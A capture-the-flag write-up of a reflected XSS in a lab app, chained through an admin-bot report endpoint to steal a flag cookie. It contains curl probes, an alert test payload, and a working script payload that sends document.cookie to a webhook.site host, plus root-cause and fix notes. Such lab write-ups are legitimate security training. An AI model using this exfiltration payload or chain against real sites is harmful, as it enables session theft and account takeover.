# Parrot Pwnbox Lab - Reflected XSS Admin Bot Cookie Exfil

Date: 2026-07-08
Target type: CTF/lab
Bug class: Reflected XSS, admin bot abuse, cookie disclosure

## Observation

Aviary-themed app at `https://d5a6fc460194.pwnbox-lab.com/`.

Initial page hints:

- "Type something. The parrot will repeat it."
- "The admin enjoys a good repetition."
- Vocalization sample form uses GET parameter `q`.
- "send to admin" modal POSTs a URL to `/api/report`.

Relevant frontend flow:

```javascript
fetch('/api/report', {
  method: 'POST',
  headers: { 'content-type': 'application/json' },
  body: JSON.stringify({ url }),
});
```

## Hypothesis

The parrot repeats user input verbatim in the transcription field. If that reflection is HTML-unsafe, a same-origin XSS URL can be reported to the admin bot, which should visit it and execute attacker JavaScript in the admin browser context.

## Evidence

Normal reflection:

```bash
curl -sS -G "https://d5a6fc460194.pwnbox-lab.com/" --data-urlencode "q=test123"
```

Reflected in:

```html
<div class="field-transcription">
  test123
</div>
```

XSS reflection:

```bash
curl -sS -G "https://d5a6fc460194.pwnbox-lab.com/" \
  --data-urlencode "q=<img src=x onerror=alert(1)>"
```

Reflected unencoded:

```html
<img src=x onerror=alert(1)>
```

Report API behavior:

```bash
curl -sS -X POST "https://d5a6fc460194.pwnbox-lab.com/api/report" \
  -H "Content-Type: application/json" \
  -d '{"url":"https://d5a6fc460194.pwnbox-lab.com/?q=test"}'
```

Result: `{"ok":true}`

External URL rejected:

```json
{"error":"The admin only visits this aviary."}
```

Working exfil payload:

```html
<script>fetch('https://webhook.site/[uuid]?c='+encodeURIComponent(document.cookie))</script>
```

Reported XSS URL to admin bot, webhook received:

```text
FLAG=pwnbox{2d7b8f3c4a916e05d2b8c4f7a9e30615}
```

## Test

1. Confirm `q` reflects into HTML body context.
2. Verify `<img>`, `<svg>`, and `<script>` payloads survive reflection.
3. Confirm `/api/report` accepts same-origin URLs only.
4. Report crafted XSS URL and capture admin cookie via webhook.

## Result

Confirmed chain:

```text
Reflected q parameter in HTML
-> XSS executes in admin browser
-> admin cookie readable from JavaScript
-> cookie exfiltrated to attacker webhook
```

Flag: `pwnbox{2d7b8f3c4a916e05d2b8c4f7a9e30615}`

## Root cause

User-controlled vocalization text was inserted into HTML without encoding. Combined with an admin bot that visits attacker-supplied same-origin URLs and a non-HttpOnly flag cookie.

## Fix

- HTML-encode reflected output or render with safe text APIs.
- Mark sensitive cookies `HttpOnly`, `Secure`, and `SameSite`.
- Do not let admin bots browse arbitrary user URLs, or isolate bot sessions from sensitive cookies.

## Future checklist item

When a lab mentions an admin bot and repetition/reflection, test reflected XSS on the repeated field first, then exfiltrate `document.cookie` through `/api/report` or equivalent report endpoints.
